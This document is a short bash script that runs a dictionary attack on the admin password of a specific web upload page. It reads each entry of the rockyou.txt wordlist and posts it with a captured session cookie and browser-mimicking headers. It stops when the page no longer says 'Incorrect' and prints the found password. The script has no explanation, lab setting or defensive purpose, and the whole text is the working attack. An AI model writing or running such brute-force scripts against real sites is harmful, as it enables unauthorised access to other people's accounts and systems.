

#!/bin/bash

TARGET="https://h2onotes.rf.gd/upload_auth.php"

WORDLIST="/usr/share/wordlists/rockyou.txt"

while IFS= read -r password
do
    response=$(
     
    curl 'https://h2onotes.rf.gd/upload_auth.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.6' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'PHPSESSID=521a1ed008488fba5eee84cd89b716bf; __test=c683be33bafefabd251cd5ef56c93e67' \
  -H 'Origin: https://h2onotes.rf.gd' \
  -H 'Referer: https://h2onotes.rf.gd/upload_auth.php' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
   -d "admin_password=$password" "$TARGET"
        )

    if [[ $response != *"Incorrect"* ]]; then
        echo "Password found: $password"
        break
    fi

done < "$WORDLIST"